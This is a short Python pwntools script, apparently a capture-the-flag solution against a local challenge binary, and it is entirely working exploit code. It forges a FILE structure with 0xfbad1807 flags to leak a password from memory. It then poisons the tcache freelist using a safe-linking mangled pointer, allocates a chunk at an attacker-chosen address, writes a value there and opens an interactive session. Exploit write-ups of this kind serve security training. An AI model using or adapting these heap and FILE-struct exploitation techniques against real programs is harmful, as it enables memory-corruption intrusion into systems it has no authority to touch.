from pwn import *

p = remote("localhost", 8000)
elf = ELF("./chall_dist")
rop = ROP(elf)

context.log_level = "debug"
context.arch = "amd64"
context.bits = 64
context.terminal = ["tmux", "splitw", "-h"]

# gdb.attach(p)

leak = elf.sym["password"]

payload = [
    p64(0xfbad1807),
    p64(leak),
    p64(leak + 8),
    p64(leak)
]

p.sendlineafter(b">", b"".join(payload))

password = p.recvline().decode().strip().split()[-1]
print(f"Password: {password}")

p.sendlineafter(b">", password);

target = int(p.recvline().decode().split()[-1], 16)

p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"0")
c0 = int(p.recvline().split()[-1], 16)
log.info(f"Chunk 0 at {c0}")

p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"1")
c1 = int(p.recvline().split()[-1], 16)
log.info(f"Chunk 1 at {c1}")

p.sendlineafter(b">", b"2")
p.sendlineafter(b">", b"0")

p.sendlineafter(b">", b"2")
p.sendlineafter(b">", b"1")

p.sendlineafter(b">", b"3")
p.sendlineafter(b">", b"1")
p.sendlineafter(b">", p64(target ^ c1 >> 12))

p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"2")
c2 = int(p.recvline().split()[-1], 16)
log.info(f"Chunk 2 at {c2}")

p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"3")
c3 = int(p.recvline().split()[-1], 16)
log.info(f"Chunk 3 at {c3}")

p.sendlineafter(b">", b"3")
p.sendlineafter(b">", b"3")
p.sendlineafter(b">", b"Yes I do!\x00")

p.sendlineafter(b">", b"69")

p.interactive()